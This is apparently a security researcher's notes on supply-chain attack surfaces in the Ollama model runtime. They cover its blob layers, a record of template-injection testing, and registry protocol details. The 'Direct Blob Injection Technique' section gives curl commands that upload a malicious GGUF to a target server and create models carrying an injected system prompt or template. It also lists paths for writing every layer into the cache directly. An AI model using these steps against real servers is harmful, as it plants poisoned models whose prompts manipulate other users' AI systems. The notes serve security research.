# Ollama Model Supply Chain — Non-GGUF Blob Layers

**Date:** 2026-05-27

## Blob Layer Types

When Ollama pulls a model, the GGUF is only ONE of several blob layers from the registry.

| Layer | Size | Content | Security Impact |
|---|---|---|---|
| model | 100MB-100GB | GGUF tensor weights | Weight hijack, DoS |
| template | 50-500B | Go text/template string | Executable code at every inference |
| system | 20-200B | Plain text system prompt | Full prompt injection |
| params | 50-200B | JSON (stop tokens) | Low-impact |
| adapter | Varies | LoRA weights | Behavior modification |
| projector | Varies | Vision weights | Behavior modification |
| messages | Varies | JSON conversation history | Conversation poisoning |

## Template Layer Analysis

The template blob is executable code rendered at every inference via tmpl.Execute(). Sandbox: Go text/template with 4 custom functions (json, currentDate, yesterdayDate, toTypeScriptType). No exec, no os.Getenv, no I/O. Verdict: RCE NOT viable.

**Live-tested template sandbox (May 2026):** Attempted injection via `tokenizer.chat_template` KV pair in GGUF metadata. All blocked by levenshtein fuzzy matching (distance < 100) against hardcoded template names. Tested 10+ payloads including known names (chatml, llama-3, gemma), Jinja2 syntax, exec injection, env access, 10K strings, binary garbage. No template layer applied in any case.

## Layer Independence

Each layer is stored independently. /api/create with files= only controls the model layer. /api/pull from registry controls ALL layers. Content addressing (sha256) protects against passive MITM but not registry compromise.

## Direct Blob Injection Technique (No Registry Needed)

A malicious registry is NOT required to inject custom layers. The local blob cache can be directly manipulated:

```bash
# 1. Upload malicious GGUF
curl -X POST http://target:11435/api/blobs/sha256:<digest> --data-binary @malicious.gguf

# 2. Create model (files= controls only the model layer)
curl -X POST http://target:11435/api/create \
  -d '{"name":"evil","files":{"model.gguf":"sha256:<digest>"}}'

# 3. For custom template/system, use modelfile approach:
curl -X POST http://target:11435/api/create \
  -d '{"name":"evil2","modelfile":"FROM sha256:<digest>\nSYSTEM \"malicious prompt\"\nTEMPLATE \"{{.Prompt}}\""}'
```

To inject ALL layers (template, system, params) without a registry, directly write to the blob cache and manifests directory:
- Blobs: `~/.ollama/models/blobs/sha256-<hex>`
- Manifests: `~/.ollama/models/manifests/<host>/<namespace>/<model>/<tag>` (NOTE: use `/` not `:` before tag)

## Registry Protocol Notes

Ollama's registry client uses OCI Distribution Spec with custom endpoints:
- `GET /v2/` — health check (must return 200)
- `GET /v2/{ns}/{model}/manifests/{tag}` — fetch manifest
- `GET /v2/{ns}/{model}/blobs/{digest}` — download layer
- `POST /v2/{ns}/{model}/blobs/uploads/?digest={digest}` — upload (returns 202 + Location)
- `GET /v2/{ns}/{model}/chunksums/{digest}` — chunk listing for large blobs

For small layers (< chunking threshold), the chunksums endpoint is skipped — client goes directly to blob URL. The `transfer.Download` path (used for models with tensor layers) has different code flow than the registry client's `Pull` method.
